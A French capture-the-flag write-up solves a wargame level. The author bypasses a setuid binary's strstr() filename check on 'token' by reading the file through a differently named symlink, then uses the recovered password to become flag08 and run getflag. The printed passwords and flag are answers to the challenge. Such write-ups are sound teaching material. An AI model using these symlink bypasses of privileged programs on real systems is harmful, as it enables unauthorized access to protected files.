Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2008(level08) gid=2008(level08) groups=2008(level08),100(users)
/home/user/level08
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

J'observe deux spécificités à ce niveau : 

`level08`, dont le `setuid` est `flag08`, et `token` avec comme propriétaire `flag08` également.

A l'accoutumé, je lis et tente d'exécuter les fichiers qui me sont proposés :

```
$ cat token
cat: token: Permission denied

$ ./level08
./level08 [file to read]
```

Je tente de passer token comme 'file to read' :

```
$ ./level08 token
You may not access 'token'
```

Je tente avec un fichier que je créé moi-même :

```
$ touch test
touch: cannot touch `test': Permission denied
```

Je ne peux pas. Je tente donc avec un symlink, pour voir si j'ai les droits :

```
$ pwd
/home/user/level08
$ ln -s /home/user/level08/token /tmp/token
$ ls -l /tmp/token
lrwxrwxrwx 1 level08 level08 24 Apr  2 00:04 /tmp/token -> /home/user/level08/token
```

Le symlink m'appartient, donc je tente d'exécuter le binaire avec le symlink :

```
$ ./level08 /tmp/token
You may not access '/tmp/token'
```

Sans succès. Je tente d'obtenir des informations avec `strings` :

```
$ strings level08
...
%s [file to read]
token
You may not access '%s'
...
```

Je vois la présence de "token" dans le code, pour avoir plus d'information, je me penche sur `ltrace` :

```
$ ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff7f4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                                = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

J'ai oublié de tester avec un argument, donc je n'observe qu'un `printf` d'erreur. Je teste avec le fichier `token` :

```
ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Je note l'utilisation de `strstr()` qui semble tenter de matcher `token` avec ce que j'imagine être le nom de mon fichier, je tente avec un symlink d'un autre nom pour m'assurer que c'est le cas :

```
$ ln -s /home/user/level08/token /tmp/flag
$ ltrace ./level08 /tmp/flag
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/flag", "token")                                              = NULL
open("/tmp/flag", 0, 014435162522)                                        = -1
err(1, 0x80487b2, 0xbffff90c, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp/flag: Permission denied
 <unfinished ...>
+++ exited (status 1) +++
```

Et j'observe que `strstr()` semble bien tenter de comparer mon input a la string `"token"`. Je tente de lancer le programme, donc, avec mon symlink du nom de `flag` : 

```
$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

Je le tente comme mot de passe pour le `level09` :

```
$ su level09
Password: quif5eloekouj29ke0vouxean
su: Authentication failure
```

Mais sans succès, j'essaye donc comme le mot de passe pour le `flag08` :

```
$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !

$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
